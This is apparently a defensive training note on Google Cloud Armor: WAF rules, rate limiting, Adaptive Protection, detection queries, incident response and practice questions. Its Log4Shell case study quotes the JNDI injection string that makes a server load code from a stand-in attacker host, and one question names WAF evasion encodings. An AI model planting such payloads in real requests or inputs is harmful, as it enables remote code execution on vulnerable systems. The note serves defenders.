GCP Cloud Armor — Edge WAF and DDoS Protection

Service: Google Cloud Armor (edge security policies, WAF, L3–L7 DDoS defense)
Attach point: Global External Application Load Balancer, Global External Proxy Network LB, Cloud CDN, Hybrid connectivity NEGs
Standards / refs: OWASP ModSecurity Core Rule Set (CRS) 3.3, MITRE ATT&CK (T1498 Network DoS, T1190 Exploit Public-Facing App), CVE-2023-44487 (HTTP/2 Rapid Reset), NIST SP 800-61r2

1. Overview

Cloud Armor is Google Cloud's edge security layer: a web application firewall (WAF), a DDoS mitigation system, and an access-control engine that sits in front of Google's Global External Load Balancers (GXLB) at the network edge — the same edge, running on the same Google Front Ends (GFEs), that fronts Google Search and YouTube. Because Google terminates external traffic at hundreds of points of presence (PoPs) close to users, the L3/L4 volumetric absorption capacity is measured in terabits per second, and always-on protection for the network and transport layers is applied automatically before a packet ever reaches your backend. On top of that always-on baseline, Cloud Armor lets you author security policies — ordered lists of rules with allow, deny, throttle, rate_based_ban, and redirect (to reCAPTCHA) actions — that are evaluated at the GFE, so malicious requests are dropped at the edge and never consume backend CPU, VPC egress, or autoscaling budget.

At scale this matters because the edge is the only place you can shed load before it costs you money and availability. A WAF at the origin still forces you to pay for the connection, TLS handshake, and compute to reject a request; Cloud Armor rejects it at the GFE. In October 2023 this architecture absorbed the largest Layer-7 DDoS on record at the time — a 398 million requests-per-second HTTP/2 Rapid Reset flood (CVE-2023-44487) — without customer-visible impact for protected properties.

TL;DR
- Cloud Armor is Google's edge WAF + DDoS service; it attaches to a Global External Load Balancer (or Cloud CDN / hybrid NEG), and rules are enforced at the GFE, not the backend.
- L3/L4 volumetric DDoS is absorbed automatically and always-on (Standard tier free); L7 WAF, rate limiting, bot management, and Adaptive Protection are the configurable layer (Managed Protection Plus is the paid tier for advanced L7 + ML).
- Rules combine a CEL match expression with an action; preconfigured WAF rules wrap OWASP ModSecurity CRS for SQLi/XSS/LFI/RCE/LFI, tunable by sensitivity level.
- Adaptive Protection is per-backend ML that baselines normal L7 traffic and auto-proposes a mitigating rule during an attack.
- Order matters: rules evaluate by ascending priority number (lowest wins); the default 2147483647 rule sets the baseline allow/deny.

2. How It Works

2.1 Core mechanics

Cloud Armor has a clean control-plane / data-plane split. The control plane is the securityPolicy API object plus its child rule objects, plus addressGroup (named IP lists) and Adaptive Protection config; you mutate these with gcloud compute security-policies … or Terraform, and Google propagates them to every GFE globally within a couple of minutes. The data plane is the fleet of GFEs at Google's edge that evaluate every incoming HTTP(S) request against the attached policy before proxying to a backend service.

A security policy is attached to one or more backend services of a Global External Application Load Balancer (via --security-policy on the backend service). There are two policy types: backend security policies (evaluated after the LB picks a backend, the classic WAF) and edge security policies (evaluated earlier, at the outermost edge, primarily for Cloud CDN-cached content and coarse IP/geo filtering — a request can be evaluated by both). Each policy is an ordered list of rules; each rule has a priority (integer, evaluated ascending — lower number = higher precedence), a match condition, and an action. Evaluation is first-match-wins: the GFE walks rules in priority order and applies the action of the first rule whose match evaluates true, then stops. A catch-all default rule at priority 2147483647 decides the fate of unmatched traffic (typically allow, or deny-403 for a default-deny posture).

Match conditions come in two flavors. Basic matches use --src-ip-ranges (CIDR list, up to 10 per rule, or a named address group). Advanced matches use a CEL (Common Expression Language) expression in the --expression flag, giving you access to origin.ip, origin.region_code (geo), request.headers['...'], request.path, request.query, request.method, and the preconfigured WAF evaluators like evaluatePreconfiguredWaf('sqli-v33-stable'). Actions are allow, deny(403|404|502), rate_based_ban, throttle, redirect (to Google reCAPTCHA or an external URL), and — with Adaptive Protection — an auto-generated deny rule.

2.2 Concrete configuration

Create a policy and set a default-deny baseline. In a high-assurance posture I default-deny and explicitly allow, but for a public web property default-allow with layered WAF is the norm. Here I show default-allow with WAF + rate limiting.

# 1. Create a backend (WAF) security policy
gcloud compute security-policies create corp-web-armor \
    --description "Edge WAF + rate limit for the public web tier" \
    --type CLOUD_ARMOR

# 2. Turn on verbose logging so we can see which rule/subsig matched
gcloud compute security-policies update corp-web-armor \
    --log-level VERBOSE

Add a preconfigured WAF rule for SQL injection. The evaluatePreconfiguredWaf CEL function runs the OWASP CRS SQLi rule set. sensitivity maps to CRS paranoia levels — level 1 is the low-false-positive baseline; I explicitly opt out of noisy subsignatures with opt_out_rule_ids after tuning against real traffic.

gcloud compute security-policies rules create 1000 \
    --security-policy corp-web-armor \
    --description "OWASP CRS SQLi, paranoia 1, tuned" \
    --expression "evaluatePreconfiguredWaf('sqli-v33-stable', {'sensitivity': 1, 'opt_out_rule_ids': ['owasp-crs-v030301-id942440-sqli']})" \
    --action deny-403

# XSS and Local/Remote File Inclusion + RCE in one composite rule
gcloud compute security-policies rules create 1010 \
    --security-policy corp-web-armor \
    --description "XSS, LFI, RFI, RCE preconfigured WAF" \
    --expression "evaluatePreconfiguredWaf('xss-v33-stable', {'sensitivity': 1}) || evaluatePreconfiguredWaf('lfi-v33-stable', {'sensitivity': 1}) || evaluatePreconfiguredWaf('rce-v33-stable', {'sensitivity': 1})" \
    --action deny-403

Rate-limit and auto-ban abusive clients. This is the single most valuable rule for credential-stuffing and L7 floods. rate_based_ban throttles a client key (here the source IP; can be HTTP_HEADER, HTTP_COOKIE, XFF_IP, or ALL for a global counter) and, once it crosses the threshold, bans it for a fixed duration.

gcloud compute security-policies rules create 2000 \
    --security-policy corp-web-armor \
    --description "Rate-based ban: 100 req / 60s per IP on /login, then 600s ban" \
    --expression "request.path.matches('/login')" \
    --action rate_based_ban \
    --rate-limit-threshold-count 100 \
    --rate-limit-threshold-interval-sec 60 \
    --ban-duration-sec 600 \
    --ban-threshold-count 100 \
    --ban-threshold-interval-sec 60 \
    --conform-action allow \
    --exceed-action deny-429 \
    --enforce-on-key IP

Named IP allow/deny lists via address groups. Reusable across many policies and firewall rules; you edit the list once and every rule referencing it updates.

gcloud network-security address-groups create corp-egress-allowlist \
    --type IPV4 --capacity 100 --location global \
    --items "203.0.113.0/24,198.51.100.7/32"

gcloud compute security-policies rules create 500 \
    --security-policy corp-web-armor \
    --description "Allow corporate ranges to /admin" \
    --expression "request.path.startsWith('/admin') && !inIpRange(origin.ip, '203.0.113.0/24')" \
    --action deny-403

Geo-block and a reCAPTCHA challenge for suspected bots.

# Block two sanctioned regions outright
gcloud compute security-policies rules create 700 \
    --security-policy corp-web-armor \
    --expression "origin.region_code == 'KP' || origin.region_code == 'CU'" \
    --action deny-403

# Send low-score sessions to a reCAPTCHA Enterprise redirect (manual challenge)
gcloud compute security-policies rules create 1500 \
    --security-policy corp-web-armor \
    --expression "request.path.matches('/checkout') && token.recaptcha_session.score < 0.5" \
    --action redirect \
    --redirect-type GOOGLE_RECAPTCHA

Turn on Adaptive Protection (ML L7 DDoS) and attach the policy.

# Enable per-backend ML DDoS detection (requires Managed Protection Plus)
gcloud compute security-policies update corp-web-armor \
    --enable-layer7-ddos-defense \
    --layer7-ddos-defense-rule-visibility STANDARD

# Attach the finished policy to the LB backend service
gcloud compute backend-services update corp-web-backend \
    --security-policy corp-web-armor --global

Terraform equivalent (what I'd actually commit — policy-as-code with review):

resource "google_compute_security_policy" "edp_web_armor" {
  name = "corp-web-armor"

  adaptive_protection_config {
    layer_7_ddos_defense_config {
      enable          = true
      rule_visibility = "STANDARD"
    }
  }

  rule {
    priority = 2000
    action   = "rate_based_ban"
    match { expr { expression = "request.path.matches('/login')" } }
    rate_limit_options {
      conform_action = "allow"
      exceed_action  = "deny(429)"
      enforce_on_key = "IP"
      rate_limit_threshold { count = 100  interval_sec = 60 }
      ban_duration_sec = 600
      ban_threshold { count = 100 interval_sec = 60 }
    }
  }

  rule {
    priority = 1000
    action   = "deny(403)"
    match { expr { expression = "evaluatePreconfiguredWaf('sqli-v33-stable', {'sensitivity': 1})" } }
  }

  rule {
    priority = 2147483647
    action   = "allow"
    match { versioned_expr = "SRC_IPS_V1" config { src_ip_ranges = ["*"] } }
  }
}

Case study 1 — The 398 Mrps HTTP/2 Rapid Reset (August–October 2023). HTTP/2 multiplexes many streams over one TCP connection. A client can open a request stream and immediately send RST_STREAM to cancel it. The server still does the work of setting up and tearing down the stream, but the cancellation frees the client's concurrency slot instantly — so a single connection can issue an unbounded rate of requests, defeating the SETTINGS_MAX_CONCURRENT_STREAMS limit that was supposed to bound work. Attackers weaponized this (CVE-2023-44487) to reach 398 million requests per second against Google. Cloud Armor and the GFE fleet absorbed it because Google (a) has massive globally distributed L7 capacity, and (b) shipped heuristics that detect abnormal rapid stream-reset ratios and throttle offending connections. The control that stopped it was the edge L7 absorption + Rapid Reset mitigation built into the GFE; a customer origin WAF would have been overrun long before. Lesson in a design review: you cannot rate-limit your way out of a 398 Mrps flood at your origin — the defense must live at an edge with Tbps/Mrps headroom.

Case study 2 — Log4Shell virtual patching (December 2021). When CVE-2021-44228 dropped, exploitation was trivial: put ${jndi:ldap://attacker/x} in any logged field (User-Agent, URI, form data). Patching every Java service takes days. Cloud Armor customers deployed a custom CEL rule matching the JNDI pattern across headers and body plus Google's cve-canary preconfigured signature, blocking exploit strings at the edge within minutes — a textbook virtual patch buying time to patch backends. The control was preconfigured WAF + custom rule as a compensating control; the lesson is that a WAF's real value is often the speed of shipping a virtual patch, not steady-state filtering.

Case study 3 — The 46 Mrps flood and Adaptive Protection (June 2022). A Layer-7 HTTPS flood ramped from 10k to 46 million requests per second in under 10 seconds, from 5,256 IPs in 132 countries (Tor exit nodes were a notable fraction). Google Cloud Armor Adaptive Protection had already alerted the customer before the attack peaked, because its per-backend ML baseline detected the anomalous rise and generated a recommended rule with a signature the customer could deploy in one click. The control was Adaptive Protection ML detection → suggested rule → edge enforcement; the lesson is that human-authored static rules cannot keep pace with a flood that reaches peak in 10 seconds — you need ML that proposes mitigations in near real time.

Top 5 in depth

1. Preconfigured WAF rules (OWASP CRS) with disciplined tuning. Cloud Armor wraps the OWASP ModSecurity Core Rule Set 3.3 into named evaluators (sqli-v33-stable, xss-v33-stable, lfi-v33, rce-v33, rfi-v33, protocolattack-v33, scannerdetection-v33, sessionfixation-v33). Each is invoked in a CEL expression and returns true when the request matches any of its subsignatures. The critical knob is sensitivity (0–4), mapping to CRS paranoia levels: level 1 is a curated low-false-positive set; each level up adds broader (noisier) rules. Technically each subsignature has an ID like owasp-crs-v030301-id942100-sqli, and you can surgically disable a noisy one with opt_out_rule_ids or force-enable a stricter one with opt_in_rule_ids. How I deploy it: start every preconfigured rule at sensitivity: 1 in preview mode, feed request logs to BigQuery for a week, count matches per subsignature against known-good traffic, opt out the false-positive generators, then flip off preview. Trade-off: these are signature/heuristic rules, not semantic parsers — they can be evaded with novel encodings and can false-positive on legitimate payloads (e.g., a blog CMS where users legitimately post SQL snippets). The WAF is a compensating control, never a substitute for parameterized queries and output encoding at the origin (see the SQLi and XSS notes).

2. Rate-based ban and throttle. This is the workhorse against L7 floods, credential stuffing, scraping, and enumeration. A throttle action enforces a steady rate and returns 429 to the overflow; rate_based_ban goes further — once a client key crosses ban_threshold_count in ban_threshold_interval_sec, that key is banned for ban_duration_sec, so you stop spending evaluation on it entirely. The client key is defined by enforce_on_key: IP, XFF_IP (only behind a trusted proxy — otherwise spoofable), HTTP_HEADER (e.g., an API key), HTTP_COOKIE (session), HTTP_PATH, SNI, REGION_CODE, or ALL (a single global counter for a coarse ceiling). Best practice: stack multiple rules — a per-IP ban to stop single-source abuse and a per-username (HTTP_HEADER/HTTP_COOKIE) ban to catch distributed credential stuffing that rotates IPs, mirroring the multi-dimensional strategy in the API-Security note. Trade-off: shared NAT/CGNAT means one IP can represent thousands of real users, so an IP ban can collateral-damage a corporate office or mobile carrier; tune thresholds against your traffic and prefer identity-based keys where you have them.

3. Adaptive Protection (ML L7 DDoS). Enabled with --enable-layer7-ddos-defense, Adaptive Protection builds a per-backend-service machine-learning baseline of normal L7 traffic (request rate, headers, methods, paths, geo, UA distributions). During an anomaly it computes an attack signature — the specific feature combination distinguishing attack from baseline — scores its confidence, raises an alert in Cloud Logging / Security Command Center, and suggests a concrete Cloud Armor rule (with the CEL expression) that isolates the attackers. You can review-and-apply or configure auto-deploy. This is what turned the 46 Mrps and 398 Mrps events into non-events: it detects and proposes in seconds, faster than any human. Trade-off: it needs a training window to baseline (cold start), it can be evaded by a slow ramp that shifts the baseline gradually (low-and-slow), and it is a Managed Protection Plus paid feature. Pair it with static rate-based rules so you're never wholly dependent on ML.

4. reCAPTCHA Enterprise bot management. Cloud Armor integrates with reCAPTCHA Enterprise at the edge using session tokens and action tokens: the client obtains a token, the token carries a fraud/bot score (0.0–1.0), and a Cloud Armor rule reads token.recaptcha_session.score to allow, deny, or redirect to a manual challenge — all evaluated at the GFE without a round-trip to your origin. This lets you gate only high-risk actions (checkout, login, account creation) rather than challenging everyone. Trade-off: tokens can be farmed by CAPTCHA-solving services, real users on privacy-hardened browsers score low and get friction, and it adds client-side integration work. Use score-based invisible assessment first, and reserve visible challenges for the lowest-scoring sessions.

5. Architecture: force all traffic through the LB (no direct-to-origin). A WAF is worthless if attackers can reach the backend directly. The control is network: give backends no public IP, and use VPC firewall rules that allow ingress only from Google's load-balancer health-check and proxy ranges (35.191.0.0/16, 130.211.0.0/22 for the classic health checkers), plus for GCS-backed origins keep buckets private and serve only through the LB. Additionally use a shared secret header injected by the LB and validated at the origin (a "did this really come through my edge?" check) to defeat origin-IP discovery. Trade-off: operational discipline — any new backend that gets a public IP or an over-broad firewall rule silently reopens the bypass, so this must be enforced by Organization Policy (compute.vmExternalIpAccess deny) and continuously audited, not just set once.

6. Detection & Response

What to log / telemetry sources

  • Cloud Armor request logs — emitted through the load balancer's requests log (resource.type="http_load_balancer"). Key fields under jsonPayload.enforcedSecurityPolicy: name (policy), outcome (ACCEPT/DENY), priority (matched rule), configuredAction, and — with --log-level VERBOSE — preconfiguredExprIds (the exact CRS subsignature IDs that matched). Also jsonPayload.remoteIp, httpRequest.requestUrl, httpRequest.userAgent, httpRequest.status.
  • Adaptive Protection alerts — jsonPayload.adaptiveProtection.confidence and suggested-rule detail; surfaced in Cloud Logging and Security Command Center as findings.
  • Rate-limit / ban telemetry — enforcedSecurityPolicy.outcome = DENY with the rate-based rule's priority; ban events show sustained denies from one key.
  • reCAPTCHA assessments — score distributions per action, token verdicts.
  • Export all of the above to BigQuery (log sink) and/or Chronicle/SIEM for retention, correlation, and the queries below.

Sample detections

SQL over a log sink exported to BigQuery — top blocked SQLi subsignatures and sources in the last hour:

SELECT
  jsonPayload.enforcedSecurityPolicy.name        AS policy,
  jsonPayload.remoteIp                            AS src_ip,
  httpRequest.requestUrl                          AS url,
  subsig                                          AS matched_crs_rule,
  COUNT(*)                                        AS hits
FROM `corp-logs.armor.compute_googleapis_com_requests_*`,
  UNNEST(jsonPayload.enforcedSecurityPolicy.preconfiguredExprIds) AS subsig
WHERE _PARTITIONTIME >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
  AND jsonPayload.enforcedSecurityPolicy.outcome = 'DENY'
  AND subsig LIKE 'owasp-crs-%sqli%'
GROUP BY policy, src_ip, url, matched_crs_rule
ORDER BY hits DESC
LIMIT 50;

Detect a distributed L7 flood — many distinct IPs, high request rate, low block ratio (evasion getting through):

SELECT
  TIMESTAMP_TRUNC(timestamp, MINUTE)              AS minute,
  COUNT(*)                                        AS total_reqs,
  COUNT(DISTINCT jsonPayload.remoteIp)            AS distinct_ips,
  COUNTIF(jsonPayload.enforcedSecurityPolicy.outcome = 'DENY') AS denied,
  SAFE_DIVIDE(COUNTIF(httpRequest.status = 200), COUNT(*))     AS success_ratio
FROM `corp-logs.armor.compute_googleapis_com_requests_*`
WHERE _PARTITIONTIME >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 MINUTE)
GROUP BY minute
HAVING total_reqs > 100000 AND distinct_ips > 5000
ORDER BY minute DESC;

Response playbook

  1. Triage / confirm (detect). Open the LB monitoring dashboard and the BigQuery flood query; confirm whether it is a genuine attack vs a traffic spike or a self-inflicted false-positive wave. Check Adaptive Protection findings in Security Command Center for a ready-made signature and confidence score.
  2. Contain — edge rules first. Deploy or accept the Adaptive Protection suggested rule at a low (high-precedence) priority. If manual, add a deny-403/deny-429 rule matching the attack signature (geo, ASN, UA, path, header). For volumetric floods, rely on the always-on absorption and tighten rate_based_ban thresholds. Use preview mode only if you must validate against false positives; in an active incident, enforce.
  3. Contain — protect origin. Verify no direct-to-origin path exists (firewall allows only LB ranges); if a bypass is found, shut the public path immediately and rotate the LB shared-secret header.
  4. Eradicate. Narrow the mitigating rule to minimize collateral (move from broad geo-block to specific ASN/subsignature match as you learn the pattern). For an exploit attempt (SQLi/RCE), pair the WAF rule with an origin patch — the WAF is the stopgap, the code fix is the cure.
  5. Recover. Once traffic normalizes, relax temporary broad blocks in stages, watching success_ratio and error rates so you don't re-open exposure or keep legitimate users locked out. Convert any effective emergency rule into reviewed policy-as-code.
  6. Post-incident. Export the attack window from BigQuery; document peak Mrps/bps, source distribution, matched subsignatures, and time-to-mitigate. Feed learnings into rate thresholds and Adaptive Protection tuning; update runbooks.

7. Practice Questions

Tier 1 — Fundamentals

Q1. What is Cloud Armor and where in the request path does it enforce?
Cloud Armor is Google Cloud's edge WAF and DDoS-mitigation service. It attaches a security policy to a backend service of a Global External Load Balancer (or Cloud CDN / hybrid NEG), and enforcement happens at the Google Front End (GFE) at the network edge — before traffic reaches your backend. That placement means malicious requests are dropped without consuming backend compute, VPC egress, or autoscaling budget, and volumetric L3/L4 floods are absorbed by Google's global edge capacity.
Signal: Does the candidate know it's edge-enforced (not origin) and tied to the global LB?

Q2. How does rule evaluation order work in a security policy?
Each rule has an integer priority; rules are evaluated in ascending order (lowest number first). Evaluation is first-match-wins — the first rule whose match condition is true applies its action and stops evaluation. A default rule at priority 2147483647 handles unmatched traffic. So you put specific allows/denies at low numbers and the catch-all at the top number; a broad allow placed at a low priority will shadow more specific denies below it.
Signal: Understands ordered, first-match semantics and the shadowing pitfall.

Q3. What are preconfigured WAF rules and what do they cover?
They are Google-maintained rule sets wrapping the OWASP ModSecurity Core Rule Set 3.3, exposed as CEL evaluators like evaluatePreconfiguredWaf('sqli-v33-stable', {...}). They cover SQLi, XSS, LFI, RFI, RCE, protocol attacks, scanner detection, and session fixation. You tune them with a sensitivity level (0–4, mapping to CRS paranoia) and can opt individual subsignatures in or out by ID. They are heuristic/signature-based compensating controls, not a replacement for secure coding.
Signal: Knows CRS origin, the categories, and the sensitivity/tuning knobs.

Q4. Difference between throttle and rate_based_ban?
throttle enforces a steady rate and returns 429 to overflow requests, but never blocks the client outright. rate_based_ban throttles and, once a client key crosses a ban threshold, bans that key for a configured duration so all its requests are dropped without further evaluation. Both let you pick the client key (IP, XFF_IP, HTTP_HEADER, HTTP_COOKIE, etc.). Use rate_based_ban for abusive floods/credential stuffing, throttle for smoothing legitimate bursty traffic.
Signal: Distinguishes rate-shaping from banning and knows client-key selection.

Q5. What DDoS protection do you get automatically vs. what you must configure?
L3/L4 volumetric absorption is always-on and automatic (Standard tier, free) — SYN floods, UDP floods, amplification are soaked up at Google's edge. What you configure is the L7 layer: WAF rules, rate limiting, geo/IP allow-deny, bot management, and Adaptive Protection (ML L7 DDoS, a Managed Protection Plus feature). So volumetric defense is a given; application-layer defense is your responsibility to author.
Signal: Cleanly separates always-on L3/L4 from configurable L7.

Tier 2 — System design / trade-offs

Q6. Design edge protection for a global e-commerce site with login, search, and checkout.
I'd front everything with a Global External Application Load Balancer and attach a Cloud Armor backend policy. Layer the rules by priority: (1) low-priority IP/geo allow-deny and address-group blocks for known-bad and sanctioned regions; (2) preconfigured WAF (SQLi/XSS/LFI/RCE at sensitivity 1, tuned via preview + BigQuery) as deny-403; (3) rate-based ban on /login keyed by both IP and a session/username header to defeat distributed credential stuffing; (4) reCAPTCHA Enterprise score-gating on /checkout and account creation, challenging only low-score sessions; (5) enable Adaptive Protection for ML L7 DDoS with alerting to SecOps. Architecturally, backends have no public IP and firewalls allow only LB ranges, with an LB-injected shared secret header validated at origin to kill direct-to-origin bypass. Everything is policy-as-code in Terraform with review, and I ship new rules in preview mode first. Logging is VERBOSE, exported to BigQuery and the SIEM.
Signal: Layered defense, key selection, false-positive discipline, anti-bypass architecture, observability.

Q7. How do you roll out a new WAF rule without breaking production?
Use preview mode (--preview): the rule evaluates and logs what it would do (previewSecurityPolicy in logs) but doesn't enforce. Deploy at sensitivity 1, run for a representative window (a week including peak/business cycles), then query request logs in BigQuery for matches against known-good traffic, grouping by CRS subsignature ID. Opt out the subsignatures generating false positives, re-preview, and only then flip enforcement on. Roll out to a canary backend or a fraction of traffic first if possible. This staged approach prevents the classic self-inflicted outage where an over-sensitive WAF blocks legitimate users.
Signal: Knows preview mode, data-driven tuning, and the false-positive risk.

Q8. A shared corporate office behind one NAT IP keeps getting rate-limit-banned. What do you do?
The problem is that enforce_on_key = IP treats thousands of NAT'd users as one client. Options, in order of preference: (1) switch the key to an identity dimension — a session cookie or authenticated user header (HTTP_COOKIE/HTTP_HEADER) — so limits are per-user, not per-egress-IP; (2) if the office is trusted, allowlist its range via an address group at a higher-precedence priority so it skips the rate rule; (3) if you must key on IP but the client is behind your own trusted proxy, use XFF_IP to get the real client IP (only when the XFF header is trustworthy, else it's spoofable). I'd also raise the threshold for known corporate ranges. The general lesson: IP-based limiting collateral-damages CGNAT/NAT, so prefer identity keys.
Signal: Understands NAT collateral damage and identity-vs-IP keying and XFF spoofing risk.

Q9. When would you use an edge security policy vs. a backend security policy?
Backend policies (CLOUD_ARMOR) are the full WAF, evaluated after the LB selects a backend, with access to the complete CEL feature set including preconfigured WAF and rate limiting — this is where nearly all rules live. Edge policies (CLOUD_ARMOR_EDGE) are evaluated earlier, at the outermost edge, primarily to filter requests to Cloud CDN-cached content and do coarse IP/geo allow-deny before cache lookup — protecting even cache hits and cheaply. A request can be evaluated by both. Use edge policies to drop obviously unwanted traffic (geo blocks, known-bad IPs) as early and cheaply as possible, and backend policies for the rich WAF/rate-limit logic. Note edge policies have a narrower feature set (no rate limiting, no preconfigured WAF).
Signal: Knows the two policy types, their evaluation points, and CDN interaction.

Q10. Cloud Armor vs. AWS WAF+Shield vs. Azure Front Door WAF+DDoS — how do you translate?
All three provide edge WAF + DDoS, but the packaging differs. AWS splits it: WAF (rule-based, attached to CloudFront/ALB/API-GW), Shield Standard (free, always-on L3/L4) and Shield Advanced (paid, adds L7 protections, DDoS Response Team, cost protection). Azure pairs Front Door / Application Gateway WAF (managed CRS rule sets) with Azure DDoS Protection (Network/IP tiers, always-on with the paid tier adding metrics, rapid response, cost protection). GCP bundles more into Cloud Armor: always-on L3/L4 (Standard, free) plus L7 WAF/rate-limit/Adaptive Protection (Managed Protection Plus). The concepts map — CRS-based managed rules, custom rules, rate limiting, ML DDoS detection, bill protection — but the tier/pricing boundaries and rule languages (CEL vs AWS's JSON statements vs Azure's custom rules) differ. See the AWS WAF/Shield and Azure DDoS notes for detail.
Signal: Cross-cloud fluency and awareness that the boundaries between free/paid and WAF/DDoS differ per provider.

Tier 3 — Expert / deep-dive

Q11. Walk through the HTTP/2 Rapid Reset attack and why Cloud Armor absorbed 398 Mrps.
HTTP/2 multiplexes streams over one TCP connection, bounded by SETTINGS_MAX_CONCURRENT_STREAMS. The Rapid Reset technique (CVE-2023-44487) opens a request stream and immediately sends RST_STREAM to cancel it; the cancellation frees the client's concurrency slot instantly while the server still incurs stream setup/teardown work, so one connection can drive a near-unbounded request rate — defeating the concurrency cap that was supposed to bound server work. Attackers reached 398 million req/s against Google in October 2023. Cloud Armor/GFE absorbed it for two reasons: (1) Google's edge has enormous distributed L7 capacity (the same fleet fronting Search/YouTube), and (2) the GFE implements heuristics that detect abnormal open-then-reset ratios per connection and throttle or close offending connections. The takeaway: at 398 Mrps, no origin-side rate limiter helps — mitigation must be at an edge with Mrps-scale headroom, plus a protocol-aware heuristic for the specific abuse.
Signal: Deep protocol understanding + why edge scale + heuristic is the answer.

Q12. How does Adaptive Protection actually detect and mitigate an L7 DDoS, and what are its blind spots?
Adaptive Protection builds a per-backend-service ML baseline over L7 features — request rate, method/path/header distributions, geo, UA, and more. During an anomaly it identifies the attack signature: the minimal feature combination that separates attack traffic from the learned baseline (e.g., a specific UA + path + region cluster). It scores confidence, raises a Cloud Logging / Security Command Center alert, and generates a candidate Cloud Armor rule (the CEL expression) you can apply or auto-deploy. Blind spots: (1) cold start — it needs a baseline window, so a brand-new backend is under-protected initially; (2) low-and-slow attacks that ramp gradually can shift the baseline so the anomaly never trips; (3) it's per-backend, so a signal spread thin across many backends may not stand out; (4) it's a paid (Managed Protection Plus) feature. Mitigation: pair it with static rate-based rules and manual thresholds so ML is a force-multiplier, not a single point of failure.
Signal: Knows the ML mechanics, the suggested-rule loop, and the honest limitations.

Q13. An attacker is bypassing your SQLi preconfigured rule with double-URL-encoding and inline comments. How do you respond, and what's the deeper lesson?
First, confirm via VERBOSE logs which requests are getting through (200s with SQLi-shaped payloads). Short-term: raise the SQLi rule sensitivity so more CRS subsignatures (including comment/encoding evasion checks) engage, and add a custom CEL rule matching the specific evasion pattern (e.g., repeated %25 double-encoding or /**/ comment sequences) as deny-403 — a targeted virtual patch. Enable body inspection where the payload rides in POST data. But the deeper lesson is that a WAF is a heuristic pattern matcher, not a SQL parser — it will always be evadable with enough encoding creativity, so the durable fix is at the origin: parameterized queries / prepared statements and least-privilege DB accounts, which make injection structurally impossible regardless of what reaches the app (see the SQLi note). The WAF buys time; the code fix closes the hole.
Signal: Practical WAF tuning plus the maturity to say WAF is compensating, not curative.

Q14. How do you prevent attackers from bypassing Cloud Armor entirely by hitting the origin directly?
The WAF only protects traffic that flows through the LB, so I must make the backend unreachable except via the LB. Concretely: (1) backends have no external IP (enforce with Org Policy compute.vmExternalIpAccess deny and constraints/compute.restrictLoadBalancerCreationForTypes); (2) VPC firewall ingress allows only Google's LB/health-check ranges (e.g., 35.191.0.0/16, 130.211.0.0/22) and denies the rest; (3) for GCS-backed origins, keep buckets private and serve only through the LB with signed access; (4) inject a secret custom header at the LB and validate it at the origin so even a leaked origin IP can't be abused without the secret; (5) continuously audit for drift — any new public IP or over-broad firewall rule reopens the bypass, so this is enforced by policy and monitored, not set-and-forget. Attackers routinely enumerate origin IPs via historical DNS, certificate transparency logs, and misconfigured subdomains, so assume the origin IP will leak and defend accordingly.
Signal: Thinks about the whole attack surface, not just the WAF; knows origin-discovery techniques.

Q15. Design a defense against a distributed credential-stuffing campaign that rotates across 50,000 residential-proxy IPs.
Per-IP rate limiting is defeated by 50k rotating IPs — each IP looks low-volume — so I attack it on multiple axes. (1) Per-identity rate limiting: a rate_based_ban keyed by HTTP_HEADER/HTTP_COOKIE (username or session) catches the fact that a single account is being hammered from many IPs, and a per-username failure threshold triggers step-up. (2) reCAPTCHA Enterprise score-gating on /login: invisible assessment scores each session; low scores get a challenge or deny, and residential-proxy botnets typically score poorly and can't cheaply solve challenges at scale. (3) Adaptive Protection to catch the aggregate anomaly and suggest a signature (the campaign often shares a UA, TLS fingerprint, or path pattern). (4) Global counters (enforce_on_key = ALL) as a coarse ceiling on /login request rate. (5) Backend controls beyond Cloud Armor: breached-password checks, account lockout with exponential backoff, and mandatory MFA so a correct password alone isn't account takeover. Layering identity-keyed limits + bot scoring + ML + backend auth hardening turns an IP-rotation-immune attack into a detectable, contained one. This mirrors the multi-dimensional rate-limiting strategy in the API-Security note.
Signal: Recognizes IP-keying is insufficient, layers identity + bot + ML + backend auth, and connects to broader ATO defense.

9. Key Takeaways

  • Cloud Armor enforces at the GFE edge, in front of the Global External Load Balancer — malicious traffic is dropped before it costs you backend compute, egress, or autoscale spend.
  • L3/L4 volumetric DDoS is always-on and free (Standard tier); L7 WAF, rate limiting, bot management, and Adaptive Protection ML are the layer you configure (Managed Protection Plus for the advanced/ML features).
  • Rules are ordered by ascending priority and are first-match-wins, with a default rule at 2147483647; a broad allow at low priority silently shadows your denies — order is a security control.
  • Preconfigured WAF rules wrap OWASP ModSecurity CRS 3.3 for SQLi/XSS/LFI/RFI/RCE; tune with sensitivity (0–4) and per-subsignature opt_out_rule_ids, always via preview mode first to avoid self-inflicted outages.
  • Rate-based ban keyed on identity (not just IP) is the durable answer to credential stuffing and distributed L7 floods, because IP-only keying is defeated by proxy rotation and collateral-damages NAT.
  • Adaptive Protection detects L7 DDoS with per-backend ML and proposes a mitigating rule in seconds — the reason 46 Mrps (2022) and 398 Mrps (2023) events were non-events — but has cold-start and low-and-slow blind spots, so pair it with static rules.
  • The 398 Mrps HTTP/2 Rapid Reset (CVE-2023-44487) proved that origin-side rate limiting is futile at scale; only an edge with Mrps headroom plus a protocol-aware heuristic survives.
  • A WAF is a compensating control, not a cure — parameterized queries, output encoding, and MFA at the origin close the actual holes; the WAF buys time and virtual-patches (Log4Shell).
  • Force all traffic through the LB — no public-IP backends, firewalls scoped to Google LB ranges, and an LB-injected secret header — or attackers bypass Cloud Armor entirely by discovering the origin IP.
  • Log VERBOSE and export to BigQuery/SIEM — the preconfiguredExprIds subsignature field is what makes tuning and detection data-driven rather than guesswork.
